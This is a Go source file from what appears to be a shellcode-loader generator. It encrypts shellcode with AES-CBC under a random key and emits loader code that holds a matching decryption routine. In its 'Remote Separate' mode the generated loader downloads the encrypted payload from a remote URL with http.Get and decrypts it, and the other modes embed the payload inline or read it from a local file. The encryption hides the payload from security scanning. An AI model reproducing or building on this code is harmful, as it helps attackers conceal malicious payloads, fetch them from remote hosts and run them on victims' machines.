package encode

var (
	CbcDecrypt = []string{
		`func f(ciphertext []byte, randomKey, ivStr string) []byte {
			keyBytes, err := hex.DecodeString(randomKey)
			if err != nil {
				return []byte{}
			}
			block, err := aes.NewCipher(keyBytes)
			if err != nil {
				return []byte{}
			}
			blockSize := block.BlockSize()
			iv, err := hex.DecodeString(ivStr)
			if err != nil {
				return []byte{}
			}
			if len(iv) != blockSize {
				return []byte{}
			}
			if len(ciphertext) < blockSize {
				return []byte{}
			}
			ciphertext = ciphertext[blockSize:]
			mode := cipher.NewCBCDecrypter(block, iv)
			plaintext := make([]byte, len(ciphertext))
			mode.CryptBlocks(plaintext, ciphertext)
			plaintext, err = PKCS7Unpadding(plaintext)
			if err != nil {
				return []byte{}
			}
				return plaintext
			}
		func PKCS7Unpadding(data []byte) ([]byte, error) {
			length := len(data)
			unpadding := int(data[length-1])
			if unpadding > length {
				return nil, fmt.Errorf("invalid padding")
			}
				return data[:(length - unpadding)], nil
			}`,
		`
		"crypto/aes"
		"fmt"
		"crypto/cipher"
		"encoding/hex"
		`, `
		"crypto/aes"
		"io/ioutil"
		"fmt"
		"crypto/cipher"
		"encoding/hex"
		`, `
		"crypto/aes"
		"net/http"
		"io/ioutil"
		"fmt"
		"crypto/cipher"
		"encoding/hex"
		`,
	}
)

func CbcGenerate(byteData []byte, sepMode, sepSrc string) string {
	randomKey, _ := GenerateRandomString(32)
	encryptShellcode, IV := AesEncryptByCBC(byteData, randomKey) //进行加密处理
	hexString := byteSliceToHexString(encryptShellcode)
	switch sepMode {
	case "default":
		byteString := "byteSlice :=" + hexString + "\n\t" + "byteSlice = f(byteSlice,\"" + randomKey + "\",\"" + IV + "\")\n\t"
		return byteString
	case "Local Separate":
		// 创建一个文件来写入加密的数据
		CreateSeprarteLocalFile(encryptShellcode, sepSrc)
		byteString := "byteSlice, _ := ioutil.ReadFile(\"" + sepSrc + "\")" + "\n\t" + "byteSlice = f(byteSlice,\"" + randomKey + "\",\"" + IV + "\")\n\t"
		return byteString
	case "Remote Separate":
		// 创建一个文件来写入加密的数据 存储到本地,使用时需要重命名
		CreateSeprarteLocalFile(encryptShellcode, "sc.ini")
		byteString := `res, _ := http.Get("` + sepSrc + `")
					byteSlice, _ := ioutil.ReadAll(res.Body) 
					byteSlice = f(byteSlice,` + "\"" + randomKey + "\",\"" + IV + "\"" + `)`
		return byteString
	}
	return "Error"
}
